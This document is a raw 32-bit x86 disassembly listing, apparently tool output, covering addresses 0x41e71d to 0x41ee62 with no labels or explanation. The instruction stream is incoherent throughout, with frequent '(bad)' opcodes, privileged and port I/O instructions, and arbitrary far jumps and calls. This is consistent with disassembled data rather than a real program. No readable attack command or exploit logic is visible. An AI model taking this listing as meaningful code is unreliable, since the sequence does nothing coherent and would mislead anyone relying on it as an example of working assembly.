  41e71d:	sub    DWORD PTR [edx-0x32c5aaea],edx
  41e723:	add    bl,al
  41e725:	mov    esi,DWORD PTR [esi+0x685054b]
  41e72b:	pusha  
  41e72c:	mov    ebp,0x542f6052
  41e731:	sub    edx,DWORD PTR [eax-0xe95edb4]
  41e737:	jp     0x41e6c2
  41e739:	fnstenv [edi]
  41e73b:	xlat   BYTE PTR ds:[ebx]
  41e73c:	xchg   esp,eax
  41e73d:	test   DWORD PTR [ebx+0x5a],ebx
  41e740:	jecxz  0x41e761
  41e742:	dec    esp
  41e743:	pop    edx
  41e744:	ss popa 
  41e746:	stos   DWORD PTR es:[edi],eax
  41e747:	call   0x44a1:0x14abbe9f
  41e74e:	ins    DWORD PTR es:[edi],dx
  41e74f:	fild   QWORD PTR [edx+0x640eece]
  41e755:	and    al,BYTE PTR [ecx+0x75628acf]
  41e75b:	xor    BYTE PTR gs:[ebx-0x532e7708],al
  41e762:	fsub   DWORD PTR [ecx-0x28aa3f08]
  41e768:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e769:	dec    esp
  41e76a:	imul   ebx,DWORD PTR [edx],0xfffffffa
  41e76d:	fist   WORD PTR [ebp-0x2e]
  41e770:	jne    0x41e7dd
  41e772:	test   DWORD PTR [ebp+ebx*8-0x28],0x92c6e810
  41e77a:	vunpckhps ymm0,ymm0,YMMWORD PTR [ebx-0x15]
  41e77f:	or     esi,DWORD PTR [esp+edx*1+0x8]
  41e783:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e784:	fild   WORD PTR [ecx-0x6e]
  41e787:	jp     0x41e737
  41e789:	mov    BYTE PTR [edx-0x2ce15279],0x65
  41e790:	dec    ebp
  41e791:	dec    edx
  41e792:	xchg   edi,eax
  41e793:	nop
  41e794:	(bad)  
  41e795:	clc    
  41e796:	je     0x41e761
  41e798:	adc    DWORD PTR [eax-0x15bd6ee6],0xc8b700ec
  41e7a2:	xor    BYTE PTR [ecx],0x2f
  41e7a5:	mov    bh,0x94
  41e7a7:	add    edx,edi
  41e7a9:	or     bh,dl
  41e7ab:	cwde   
  41e7ac:	jmp    DWORD PTR [esi]
  41e7ae:	in     eax,dx
  41e7af:	outs   dx,DWORD PTR ds:[esi]
  41e7b0:	aas    
  41e7b1:	push   eax
  41e7b2:	jmp    0xa56f35d8
  41e7b7:	push   ss
  41e7b8:	loop   0x41e77e
  41e7ba:	ret    
  41e7bb:	stc    
  41e7bc:	out    dx,al
  41e7bd:	aas    
  41e7be:	and    BYTE PTR [ecx+0x2e19450c],ah
  41e7c4:	stos   DWORD PTR es:[edi],eax
  41e7c5:	jmp    0x194b:0x3527e226
  41e7cc:	pop    ebx
  41e7cd:	pushf  
  41e7ce:	pop    esi
  41e7cf:	mov    ebp,0x947b54c
  41e7d4:	add    eax,0x6513d768
  41e7d9:	and    al,0x72
  41e7db:	cmc    
  41e7dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7dd:	adc    esi,0x842a0fa7
  41e7e3:	sub    DWORD PTR [ebp-0x6d59597b],0x662baf7f
  41e7ed:	retf   
  41e7ee:	add    esi,DWORD PTR [eax-0x7]
  41e7f1:	mov    dl,0x91
  41e7f3:	imul   ecx,edi,0xb91fa4f7
  41e7f9:	xor    eax,0xf19e62df
  41e7fe:	dec    eax
  41e7ff:	jno    0x41e845
  41e801:	arpl   WORD PTR [ecx+ebp*4-0x72],cx
  41e805:	dec    esp
  41e806:	push   edx
  41e807:	push   ds
  41e808:	jmp    FWORD PTR [esi]
  41e80a:	jmp    0x91cb245f
  41e80f:	bound  esi,QWORD PTR [ebp+0x75345520]
  41e815:	mov    ds:0xacdbc223,eax
  41e81b:	and    eax,0x58
  41e81e:	sti    
  41e81f:	adc    dh,BYTE PTR [ecx]
  41e821:	lock (bad) 
  41e823:	mov    bh,0x6f
  41e825:	pop    edi
  41e826:	mov    dl,0x77
  41e828:	jb     0x41e7cb
  41e82a:	mov    dl,0x3c
  41e82c:	int    0x8b
  41e82e:	popf   
  41e82f:	and    DWORD PTR [ecx],0x779dbfb9
  41e835:	inc    esi
  41e836:	pop    es
  41e837:	mov    BYTE PTR [esi+0x5b77b337],ch
  41e83d:	inc    edx
  41e83e:	xor    ah,0x28
  41e841:	inc    eax
  41e842:	cmc    
  41e843:	aam    0x3
  41e845:	xlat   BYTE PTR ds:[ebx]
  41e846:	outs   dx,DWORD PTR ds:[esi]
  41e847:	sub    BYTE PTR [ecx-0x29d08e92],dh
  41e84d:	add    dh,bh
  41e84f:	xor    BYTE PTR [esi],al
  41e851:	popf   
  41e852:	(bad)  
  41e853:	out    dx,al
  41e854:	bound  esi,QWORD PTR [ebp+0x7c]
  41e857:	addr16 loop 0x41e8c0
  41e85a:	adc    BYTE PTR [edi],cl
  41e85c:	and    edx,DWORD PTR [edi+eax*8-0x4924fa75]
  41e863:	adc    al,0xfb
  41e865:	icebp  
  41e866:	jp     0x41e849
  41e868:	pop    esp
  41e869:	ret    
  41e86a:	mov    ebx,0x5e94dfb7
  41e86f:	cdq    
  41e870:	jne    0x41e86e
  41e872:	cmp    eax,0x21174362
  41e877:	neg    ah
  41e879:	lock ins BYTE PTR es:[edi],dx
  41e87b:	stc    
  41e87c:	repz rol DWORD PTR [ebx],0x0
  41e880:	adc    BYTE PTR ds:0x4bb66975,0x91
  41e887:	xchg   DWORD PTR ds:0x11451cae,ecx
  41e88d:	mov    al,dh
  41e88f:	shr    BYTE PTR [eax+0x60],cl
  41e892:	xor    cl,ch
  41e894:	sub    al,0xdf
  41e896:	aad    0x10
  41e898:	adc    edi,ebx
  41e89a:	mov    ds:0xad708f16,al
  41e89f:	(bad)  
  41e8a0:	repnz mov BYTE PTR [esi-0x7],dh
  41e8a4:	push   edi
  41e8a5:	cwde   
  41e8a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8a7:	mov    ecx,0x3ce2e02b
  41e8ac:	dec    esp
  41e8ad:	push   ds
  41e8ae:	xor    bl,BYTE PTR [ebp-0x4e]
  41e8b1:	push   esi
  41e8b2:	out    0xd4,eax
  41e8b4:	mov    ch,BYTE PTR [esi]
  41e8b6:	stos   BYTE PTR es:[edi],al
  41e8b7:	push   edi
  41e8b8:	mov    ecx,0x860d2c5b
  41e8bd:	dec    edi
  41e8be:	adc    bh,BYTE PTR [edx+0x3d]
  41e8c1:	sbb    DWORD PTR [edi],edi
  41e8c3:	in     eax,dx
  41e8c4:	pop    es
  41e8c5:	pop    ebx
  41e8c6:	addr16 add bh,ch
  41e8c9:	add    esi,DWORD PTR [ebp*2-0x1b7fff64]
  41e8d0:	(bad)  
  41e8d1:	mov    bh,0xaf
  41e8d3:	aam    0x68
  41e8d5:	xlat   BYTE PTR ds:[ebx]
  41e8d6:	pop    edi
  41e8d7:	pop    ds
  41e8d8:	mov    eax,ds:0x3a90ae95
  41e8dd:	aaa    
  41e8de:	lods   al,BYTE PTR ds:[esi]
  41e8df:	addr16 xchg ecx,eax
  41e8e1:	test   al,0xac
  41e8e3:	sbb    dh,ch
  41e8e5:	out    dx,al
  41e8e6:	and    dl,BYTE PTR [ebp-0x5c7d3220]
  41e8ec:	cmp    al,0x28
  41e8ee:	pop    es
  41e8ef:	icebp  
  41e8f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8f1:	mov    edx,DWORD PTR [edi-0x64f20a37]
  41e8f7:	aaa    
  41e8f8:	out    0x30,al
  41e8fa:	js     0x41e8fe
  41e8fc:	loope  0x41e8e5
  41e8fe:	jp     0x41e8db
  41e900:	add    al,0xaa
  41e902:	daa    
  41e903:	mov    ch,BYTE PTR [ebx+edi*8+0x68]
  41e907:	mov    esp,0x4def31ff
  41e90c:	fdiv   DWORD PTR [esi-0x6ba28bc8]
  41e912:	loope  0x41e90e
  41e914:	pop    esp
  41e915:	sbb    BYTE PTR [esi],ch
  41e917:	add    eax,eax
  41e919:	sub    al,0xf7
  41e91b:	into   
  41e91c:	(bad)  
  41e91d:	xchg   ebx,eax
  41e91e:	fidiv  WORD PTR [edx+0x688aa02b]
  41e924:	and    bh,BYTE PTR [esi+edx*4-0x2e]
  41e928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e929:	(bad)  
  41e92a:	adc    eax,DWORD PTR [ebx+edi*4-0x72]
  41e92e:	setl   BYTE PTR [edi-0x3e17d1c2]
  41e935:	jge    0x41e8c7
  41e937:	cmp    BYTE PTR [ebx],ch
  41e939:	clc    
  41e93a:	and    BYTE PTR [ecx+0x68f415f1],al
  41e940:	jb     0x41e8e3
  41e942:	jle    0x41e8fc
  41e944:	aad    0xa6
  41e946:	mov    edx,DWORD PTR [ecx]
  41e948:	imul   ecx,DWORD PTR [ebx],0x11
  41e94b:	out    0x52,eax
  41e94d:	and    ebx,DWORD PTR [ebp+0x7a85ac1b]
  41e953:	cli    
  41e954:	out    dx,eax
  41e955:	adc    ebp,esi
  41e957:	addr16 mov edx,0x758ad0f8
  41e95d:	pop    ecx
  41e95e:	fidivr DWORD PTR [esi-0x60]
  41e961:	jmp    ebx
  41e963:	aam    0x43
  41e965:	rcr    DWORD PTR [edx-0x2454fb7c],1
  41e96b:	ss mov eax,0x80ec1183
  41e971:	cli    
  41e972:	xor    al,0x3c
  41e974:	push   es
  41e975:	jmp    0x892:0x95f367e
  41e97c:	fdiv   QWORD PTR [edx]
  41e97e:	add    BYTE PTR [eax-0x825b9a9],bl
  41e984:	or     edx,edi
  41e986:	lods   eax,DWORD PTR fs:[esi]
  41e988:	shl    DWORD PTR [ecx+0x1327d16e],cl
  41e98e:	xor    al,0xec
  41e990:	or     BYTE PTR [esi-0x72],ah
  41e993:	dec    esp
  41e994:	dec    esp
  41e995:	and    BYTE PTR [eax+0x383a912],ah
  41e99b:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e99d:	in     al,0x6e
  41e99f:	mov    ch,0x8a
  41e9a1:	cmp    al,0x22
  41e9a3:	sub    al,0x41
  41e9a5:	in     eax,dx
  41e9a6:	xchg   esi,eax
  41e9a7:	leave  
  41e9a8:	(bad)  
  41e9a9:	adc    BYTE PTR [ebx+0xa44e50f],ah
  41e9af:	call   0x7ce23f0c
  41e9b4:	push   DWORD PTR [ebx+0x6f4605fd]
  41e9ba:	jb     0x41ea38
  41e9bc:	sbb    bh,BYTE PTR [edx]
  41e9be:	cmp    eax,0x985ab71a
  41e9c3:	sub    BYTE PTR [edx+0x4681a104],0xf
  41e9ca:	inc    ebp
  41e9cb:	lahf   
  41e9cc:	cmp    ebx,edi
  41e9ce:	bound  ebx,QWORD PTR [edi+0x586a139d]
  41e9d4:	pushf  
  41e9d5:	out    dx,eax
  41e9d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9d7:	push   ebp
  41e9d8:	push   0x9
  41e9da:	daa    
  41e9db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9dc:	dec    edi
  41e9dd:	cdq    
  41e9de:	loopne 0x41e9d7
  41e9e0:	in     al,0x58
  41e9e2:	fiadd  WORD PTR [edi-0x13]
  41e9e5:	and    DWORD PTR [esi+0x57],0x70
  41e9e9:	sub    al,0x59
  41e9eb:	mov    ecx,0x211df09b
  41e9f0:	imul   ecx,DWORD PTR [ecx+0x31f9c05a],0xffffffdf
  41e9f7:	int3   
  41e9f8:	adc    eax,0xc63e72f0
  41e9fd:	push   es
  41e9fe:	add    ebp,ebx
  41ea00:	(bad)  
  41ea01:	iret   
  41ea02:	retf   
  41ea03:	ins    BYTE PTR es:[edi],dx
  41ea04:	clc    
  41ea05:	lahf   
  41ea06:	or     eax,0x139ec423
  41ea0b:	addr16 in eax,0x21
  41ea0e:	ins    BYTE PTR es:[edi],dx
  41ea0f:	dec    esi
  41ea10:	out    dx,eax
  41ea11:	or     esp,DWORD PTR [esi]
  41ea13:	fisttp WORD PTR [ebx-0x31a3e690]
  41ea19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea1a:	rcr    DWORD PTR [edx],1
  41ea1c:	add    eax,0x233faff9
  41ea21:	nop
  41ea22:	sbb    esi,DWORD PTR [ecx-0xc7add4b]
  41ea28:	mov    ecx,DWORD PTR [esi+ebp*4+0x4d27fc06]
  41ea2f:	lods   al,BYTE PTR ds:[esi]
  41ea30:	hlt    
  41ea31:	call   DWORD PTR [edi+ebx*4-0x4d9c10]
  41ea38:	push   0x0
  41ea3a:	mov    bh,BYTE PTR [ebx+0x7d5d03f5]
  41ea40:	mov    ecx,0x6bbf5949
  41ea45:	mov    eax,0x5d29be74
  41ea4a:	push   esp
  41ea4b:	mov    ecx,0x37a4abdc
  41ea50:	sub    DWORD PTR [eax],eax
  41ea52:	mov    ch,0xd9
  41ea54:	pop    ecx
  41ea55:	(bad)  
  41ea56:	es aad 0xf1
  41ea59:	xchg   esp,eax
  41ea5a:	mov    fs,esi
  41ea5c:	or     edi,DWORD PTR [ebp-0x51]
  41ea5f:	stos   BYTE PTR es:[edi],al
  41ea60:	and    ah,BYTE PTR [esi-0x7df86710]
  41ea66:	ds ins BYTE PTR es:[edi],dx
  41ea68:	ret    
  41ea69:	mov    bh,0xf4
  41ea6b:	mov    ch,BYTE PTR [ebx-0x14be09f7]
  41ea71:	imul   esi
  41ea73:	jp     0x41ea94
  41ea75:	out    dx,eax
  41ea76:	sbb    eax,0x761583ce
  41ea7b:	sbb    DWORD PTR [ecx],0x5
  41ea7e:	and    al,0x4c
  41ea80:	lods   al,BYTE PTR ds:[esi]
  41ea81:	outs   dx,DWORD PTR ds:[esi]
  41ea82:	(bad)  
  41ea84:	cmp    al,0xa7
  41ea86:	xor    BYTE PTR [eax+esi*2+0x69fc454c],bl
  41ea8d:	lock adc edx,DWORD PTR [esi+esi*1-0x17b5671c]
  41ea95:	lods   al,BYTE PTR ds:[esi]
  41ea96:	mov    ch,BYTE PTR [edi+0xe317d3f]
  41ea9c:	xor    ch,ch
  41ea9e:	lods   eax,DWORD PTR ds:[esi]
  41ea9f:	mov    cl,BYTE PTR [eax+0x51806068]
  41eaa5:	popa   
  41eaa6:	mov    ?,eax
  41eaa8:	shl    ah,1
  41eaaa:	push   eax
  41eaab:	shl    DWORD PTR [esp+edi*8],0x13
  41eaaf:	adc    BYTE PTR ds:0x416e586b,dl
  41eab5:	xchg   ecx,edi
  41eab7:	dec    esi
  41eab8:	mov    bh,0xf9
  41eaba:	jb     0x41eb03
  41eabc:	jnp    0x41ea70
  41eabe:	inc    ebx
  41eabf:	icebp  
  41eac0:	add    BYTE PTR [ebp+0x3a],dl
  41eac3:	pop    ecx
  41eac4:	xor    ch,BYTE PTR [edx+0x20]
  41eac7:	dec    edi
  41eac8:	mov    eax,0xd7110d70
  41eacd:	add    al,0xae
  41eacf:	loope  0x41eb44
  41ead1:	cld    
  41ead2:	bound  eax,QWORD PTR [eax*2-0x63fa21cd]
  41ead9:	arpl   WORD PTR [edx],dx
  41eadb:	leave  
  41eadc:	mov    ebp,0x2bc8e220
  41eae1:	and    DWORD PTR [ebx+ebp*4-0x60],0x2a3738a5
  41eae9:	or     ch,cl
  41eaeb:	aas    
  41eaec:	hlt    
  41eaed:	(bad)  
  41eaee:	(bad)  
  41eaef:	out    dx,al
  41eaf0:	enter  0x1560,0x52
  41eaf4:	inc    edx
  41eaf5:	pop    ecx
  41eaf6:	fimul  WORD PTR [ecx]
  41eaf8:	xchg   esi,eax
  41eaf9:	stos   DWORD PTR es:[edi],eax
  41eafa:	mov    ch,0x7a
  41eafc:	push   DWORD PTR [edi-0x36]
  41eaff:	clc    
  41eb00:	push   ecx
  41eb01:	add    al,0x4e
  41eb03:	cwde   
  41eb04:	pop    esp
  41eb05:	or     BYTE PTR [ebp-0xc],dl
  41eb08:	mov    BYTE PTR [edi],ch
  41eb0a:	loop   0x41eb5f
  41eb0c:	fld    DWORD PTR [ecx+0x650c02d2]
  41eb12:	cmc    
  41eb13:	dec    ebp
  41eb14:	stc    
  41eb15:	clc    
  41eb16:	ins    DWORD PTR es:[edi],dx
  41eb17:	pop    eax
  41eb18:	pop    ebp
  41eb19:	loope  0x41eb79
  41eb1b:	nop
  41eb1c:	in     eax,dx
  41eb1d:	sar    DWORD PTR [eax+0x47],0x6
  41eb21:	pop    esp
  41eb22:	sti    
  41eb23:	(bad)  
  41eb25:	les    edx,FWORD PTR [ecx-0x76f55021]
  41eb2b:	push   esi
  41eb2c:	sub    al,0x51
  41eb2e:	mov    ah,0xae
  41eb30:	repz js 0x41eb0b
  41eb33:	stc    
  41eb34:	xchg   esi,eax
  41eb35:	scas   eax,DWORD PTR es:[edi]
  41eb36:	rol    BYTE PTR [edx],cl
  41eb38:	push   edx
  41eb39:	xor    eax,0xba9a778e
  41eb3e:	fwait
  41eb3f:	mov    ah,0x72
  41eb41:	mov    ah,BYTE PTR [ebx-0x1e2ceec9]
  41eb47:	jmp    0x41eaea
  41eb49:	dec    edi
  41eb4a:	daa    
  41eb4b:	(bad)  
  41eb4c:	mov    dh,0x65
  41eb4e:	imul   ecx,DWORD PTR [edx+0x678a4988],0x4f
  41eb55:	push   eax
  41eb56:	mov    dh,0x1c
  41eb58:	inc    ebp
  41eb59:	ins    BYTE PTR es:[edi],dx
  41eb5a:	mov    eax,0x4fab9f02
  41eb5f:	push   edx
  41eb60:	and    DWORD PTR [ecx],edi
  41eb62:	aas    
  41eb63:	dec    edi
  41eb64:	cmp    ah,BYTE PTR [eax]
  41eb66:	jne    0x41eb86
  41eb68:	out    0x18,eax
  41eb6a:	lds    esp,FWORD PTR [ebx+0x7b137cb7]
  41eb70:	lock sbb eax,0x2d861c
  41eb76:	cmc    
  41eb77:	push   es
  41eb78:	jb     0x41eb01
  41eb7a:	aam    0xe
  41eb7c:	push   0x280f4f78
  41eb81:	mov    eax,0x59a44225
  41eb86:	les    esi,FWORD PTR [edi+eax*2]
  41eb89:	or     ebx,edx
  41eb8b:	inc    esp
  41eb8c:	not    DWORD PTR [eax+edx*2-0x1e]
  41eb90:	fcom   QWORD PTR [esi+ebp*1-0x66a35621]
  41eb97:	in     eax,0x4d
  41eb99:	adc    eax,0x1d228668
  41eb9e:	(bad)  
  41eb9f:	icebp  
  41eba0:	lods   al,BYTE PTR ds:[esi]
  41eba2:	cmp    ecx,DWORD PTR [esi-0x52]
  41eba5:	adc    di,bx
  41eba8:	imul   DWORD PTR [esi]
  41ebaa:	mov    WORD PTR [ecx-0x4bc7ad6a],ss
  41ebb0:	add    ebx,ebp
  41ebb2:	test   al,0xdc
  41ebb4:	pop    es
  41ebb5:	loopne 0x41eb49
  41ebb7:	iret   
  41ebb8:	dec    ebx
  41ebb9:	jne    0x41eb65
  41ebbb:	test   eax,0x79cf50d0
  41ebc0:	fdiv   st(0),st
  41ebc2:	inc    eax
  41ebc3:	(bad)  
  41ebc4:	in     al,0x5d
  41ebc6:	adc    ebx,ebx
  41ebc8:	shl    BYTE PTR [edi+0x5db0a818],0xb9
  41ebcf:	cli    
  41ebd0:	(bad)  
  41ebd1:	mov    edi,0x2e90c8f
  41ebd6:	loope  0x41ec44
  41ebd8:	cmp    esi,DWORD PTR [edi-0x28]
  41ebdb:	mov    edi,0x93eda14a
  41ebe0:	stc    
  41ebe1:	pusha  
  41ebe2:	push   cs
  41ebe3:	jne    0x41ec60
  41ebe5:	bnd js 0x41ebb5
  41ebe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebe9:	pop    cx
  41ebeb:	and    DWORD PTR [eax+esi*8+0x28],ecx
  41ebef:	jb     0x41ec0f
  41ebf1:	cdq    
  41ebf2:	iret   
  41ebf3:	mov    cl,0xb2
  41ebf5:	pop    ss
  41ebf6:	sbb    esi,DWORD PTR [esi]
  41ebf8:	mov    dh,0x13
  41ebfa:	jge    0x41ebb2
  41ebfc:	dec    ebp
  41ebfd:	mov    dh,0xa7
  41ebff:	das    
  41ec00:	out    dx,eax
  41ec01:	sbb    esp,DWORD PTR [eax]
  41ec03:	cld    
  41ec04:	(bad)  
  41ec05:	push   ebx
  41ec06:	int    0x2a
  41ec08:	shr    BYTE PTR [edi+0x7f],1
  41ec0b:	clc    
  41ec0c:	leave  
  41ec0d:	sti    
  41ec0e:	aas    
  41ec0f:	add    bl,ch
  41ec11:	mov    bh,BYTE PTR [ebx+0x4328ab12]
  41ec17:	pushf  
  41ec18:	adc    esp,DWORD PTR [esi-0x22]
  41ec1b:	nop
  41ec1c:	mov    ecx,DWORD PTR [edi]
  41ec1e:	jns    0x41ec5c
  41ec20:	jbe    0x41eca0
  41ec22:	fsub   QWORD PTR [edx-0x75]
  41ec25:	in     al,0x44
  41ec27:	xchg   BYTE PTR [edx],ch
  41ec29:	das    
  41ec2a:	scas   eax,DWORD PTR es:[edi]
  41ec2b:	xor    al,0xd4
  41ec2d:	(bad)  
  41ec2e:	fcom   DWORD PTR [ecx+0x221aa32f]
  41ec34:	outs   dx,BYTE PTR ds:[esi]
  41ec35:	pushf  
  41ec36:	pop    ecx
  41ec37:	xchg   ebp,eax
  41ec38:	into   
  41ec39:	outs   dx,BYTE PTR ds:[esi]
  41ec3a:	aaa    
  41ec3b:	push   ds
  41ec3c:	clc    
  41ec3d:	in     al,0x3a
  41ec3f:	mov    edi,edx
  41ec41:	adc    edi,edi
  41ec43:	data16 aam 0xc1
  41ec46:	int3   
  41ec47:	dec    edx
  41ec48:	push   cs
  41ec49:	in     al,0xfd
  41ec4b:	cld    
  41ec4c:	and    BYTE PTR [ecx],cl
  41ec4e:	test   al,0x8
  41ec50:	pushf  
  41ec51:	mov    bl,0xed
  41ec53:	add    DWORD PTR [ebx-0x15a1c87c],ebx
  41ec59:	dec    eax
  41ec5a:	pop    ebx
  41ec5b:	cmp    al,0xff
  41ec5d:	stc    
  41ec5e:	mov    WORD PTR [ecx-0x75893409],es
  41ec64:	jge    0x41ec4d
  41ec66:	inc    ecx
  41ec67:	mov    ebp,0xfa46cc41
  41ec6c:	ret    
  41ec6d:	popf   
  41ec6e:	dec    esi
  41ec6f:	xor    eax,DWORD PTR [edi-0x18]
  41ec72:	sbb    ah,dh
  41ec74:	mov    al,0xd8
  41ec76:	or     BYTE PTR [ecx],ah
  41ec78:	test   DWORD PTR [ecx+eax*4+0x7ee19ec2],ebp
  41ec7f:	popf   
  41ec80:	mov    eax,ds:0xdc7f77c1
  41ec85:	add    bh,bh
  41ec87:	xchg   BYTE PTR [esi-0x6d],cl
  41ec8a:	push   ebx
  41ec8b:	or     DWORD PTR [esp+edx*2-0x7ec73a14],ebp
  41ec92:	mov    esp,0x41c117ba
  41ec97:	imul   edi,DWORD PTR [eax-0x46],0x29b3d4c3
  41ec9e:	cmp    DWORD PTR [esi],edi
  41eca0:	loope  0x41ec4d
  41eca2:	fidiv  WORD PTR [esi+edx*1]
  41eca5:	xor    eax,esp
  41eca7:	sbb    ebp,ebp
  41eca9:	lods   al,BYTE PTR ds:[esi]
  41ecaa:	(bad)  
  41ecab:	neg    cl
  41ecad:	lahf   
  41ecae:	loopne 0x41ed1f
  41ecb0:	xchg   esp,eax
  41ecb1:	push   eax
  41ecb2:	aaa    
  41ecb3:	(bad)  
  41ecb4:	jg     0x41ecba
  41ecb6:	popa   
  41ecb7:	cli    
  41ecb8:	cwde   
  41ecb9:	imul   ebx,edx,0x8ba8057f
  41ecbf:	inc    edi
  41ecc0:	shl    DWORD PTR [edx],0x2e
  41ecc3:	pop    ebx
  41ecc4:	mov    eax,DWORD PTR [esi-0x2f086ee8]
  41ecca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eccb:	push   cs
  41eccc:	pop    eax
  41eccd:	cmp    esi,DWORD PTR [ecx-0x4900018a]
  41ecd3:	nop
  41ecd4:	mov    cl,0xbc
  41ecd6:	mov    ecx,0x16e8aa96
  41ecdb:	and    al,0x28
  41ecdd:	cmp    al,0xe8
  41ecdf:	sti    
  41ece0:	(bad)  
  41ece1:	jp     0x41ed09
  41ece3:	jo     0x41ecff
  41ece5:	mov    eax,0x4dc0c664
  41ecea:	or     DWORD PTR [ebp+0x1c],edx
  41eced:	je     0x41ecfd
  41ecef:	je     0x41ecc9
  41ecf1:	ror    BYTE PTR [ebp+0x2d11d696],cl
  41ecf7:	dec    ebp
  41ecf8:	or     eax,0xb6837ae8
  41ecfd:	imul   ebp,DWORD PTR ds:[esi],0xfffffff3
  41ed01:	aas    
  41ed02:	mov    eax,0x916d4cd
  41ed07:	lods   al,BYTE PTR ds:[esi]
  41ed08:	int    0x91
  41ed0a:	aad    0x12
  41ed0c:	bound  esi,QWORD PTR [edi-0x13872514]
  41ed12:	(bad)  
  41ed13:	loope  0x41ed45
  41ed15:	sti    
  41ed16:	and    esp,edi
  41ed18:	imul   ecx,DWORD PTR [ebp-0xd],0x392ddbfb
  41ed1f:	adc    ebp,DWORD PTR [edx+0x29]
  41ed22:	into   
  41ed23:	pop    esp
  41ed24:	test   DWORD PTR ds:0x1d8739b,esi
  41ed2a:	push   esi
  41ed2b:	xchg   edx,eax
  41ed2c:	fcomip st,st(6)
  41ed2e:	out    dx,al
  41ed2f:	sbb    BYTE PTR [ecx-0x3f],al
  41ed32:	mov    edi,cs
  41ed34:	sub    edx,DWORD PTR [ebp-0x4c]
  41ed37:	cs jns 0x41ecdf
  41ed3a:	mov    dh,cl
  41ed3c:	add    esp,DWORD PTR [ebp-0x74]
  41ed3f:	es leave 
  41ed41:	pop    ss
  41ed42:	mov    ds:0x6a6f6066,eax
  41ed47:	dec    edi
  41ed48:	add    edx,DWORD PTR ds:0xfb059e2f
  41ed4e:	loope  0x41ed90
  41ed50:	jp     0x41ecfb
  41ed52:	(bad)  
  41ed53:	scas   eax,DWORD PTR es:[edi]
  41ed54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed55:	call   0xa158:0x1fe9df7a
  41ed5c:	jbe    0x41ed7b
  41ed5e:	inc    esp
  41ed5f:	out    dx,eax
  41ed60:	mov    bh,0x74
  41ed62:	add    DWORD PTR [esp+0x4701fb84],0x92b19071
  41ed6d:	cli    
  41ed6e:	icebp  
  41ed6f:	sub    eax,0x73c08c7e
  41ed74:	cmp    bl,BYTE PTR es:[esi+0x61eee24c]
  41ed7b:	xchg   ebx,eax
  41ed7c:	in     eax,dx
  41ed7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed7e:	addr16 inc eax
  41ed80:	std    
  41ed81:	leave  
  41ed82:	push   es
  41ed83:	cmp    edi,DWORD PTR [edi+0x3656e0e8]
  41ed89:	fsubr  st,st(6)
  41ed8b:	mov    edx,0x2f0400d
  41ed90:	inc    esp
  41ed91:	inc    eax
  41ed92:	push   es
  41ed93:	xor    esi,esi
  41ed95:	hlt    
  41ed96:	mov    ch,0xc5
  41ed98:	jno    0x41edaf
  41ed9a:	call   0x6f0f8750
  41ed9f:	adc    DWORD PTR [edi+0x51fd060e],esi
  41eda5:	and    ebp,edi
  41eda7:	imul   edx,DWORD PTR [edi],0xffffffc5
  41edaa:	sbb    DWORD PTR [edi+0x45],edx
  41edad:	or     dl,0x7d
  41edb0:	pushf  
  41edb1:	xchg   dl,bl
  41edb3:	jg     0x41ed7b
  41edb5:	mov    bh,BYTE PTR [ebx-0x7a3bec58]
  41edbb:	stos   DWORD PTR es:[edi],eax
  41edbc:	inc    ecx
  41edbd:	mov    bh,0x47
  41edbf:	mov    edx,0xa0ccac9d
  41edc4:	inc    esi
  41edc5:	les    esp,FWORD PTR [esi+0x3a6f1907]
  41edcb:	int3   
  41edcc:	sub    BYTE PTR [ebx-0x53a620eb],dl
  41edd2:	mov    cl,0x73
  41edd4:	mov    eax,0xab56c734
  41edd9:	out    dx,eax
  41edda:	pusha  
  41eddb:	or     ah,BYTE PTR [ecx]
  41eddd:	ds inc ecx
  41eddf:	pop    edx
  41ede0:	cli    
  41ede1:	lea    ebp,[edi+0x50]
  41ede4:	pop    eax
  41ede5:	dec    edx
  41ede6:	and    ah,BYTE PTR [edi+edi*2-0x6e]
  41edea:	test   eax,0x401a254f
  41edef:	adc    DWORD PTR ds:0x4711e1b1,0x4f8deaf7
  41edf9:	push   0xffffff84
  41edfb:	jns    0x41ee56
  41edfd:	xchg   ebp,eax
  41edfe:	imul   BYTE PTR [ebp+0x1ce58478]
  41ee04:	or     BYTE PTR [edx+0x10],bl
  41ee07:	jmp    0xbc0fc7c8
  41ee0c:	jl     0x41edd9
  41ee0e:	pop    ebp
  41ee0f:	popf   
  41ee10:	ret    
  41ee11:	fild   QWORD PTR [edi-0x34]
  41ee14:	cwde   
  41ee15:	cmp    ah,BYTE PTR [ebp-0x4e]
  41ee18:	sbb    eax,0x8f14b4
  41ee1d:	or     DWORD PTR [ecx+0x6a],eax
  41ee20:	gs mov edi,0xce4928f1
  41ee26:	jmp    0xcf24:0x7b17a5c8
  41ee2d:	add    ah,BYTE PTR [edi+0x62775319]
  41ee33:	adc    edi,DWORD PTR [ebx-0x65]
  41ee36:	cmp    DWORD PTR [ebx+0x4d0e1d5a],esi
  41ee3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee3d:	pop    esi
  41ee3e:	mov    DWORD PTR [ebx-0x22],esp
  41ee41:	dec    esi
  41ee42:	aam    0x41
  41ee44:	xor    al,0x72
  41ee46:	and    ebp,DWORD PTR [edi+0x6eda870d]
  41ee4c:	or     edx,0xffffffe6
  41ee4f:	add    eax,0xdb2600d7
  41ee54:	fbld   TBYTE PTR [esi+0x46]
  41ee57:	cmp    DWORD PTR [edx],edx
  41ee59:	jnp    0x41ee85
  41ee5b:	or     ebp,esi
  41ee5d:	jo     0x41eed9
  41ee5f:	inc    ebp
  41ee60:	inc    esi
  41ee61:	dec    ebp
  41ee62:	ins    BYTE PTR es:[edi],dx
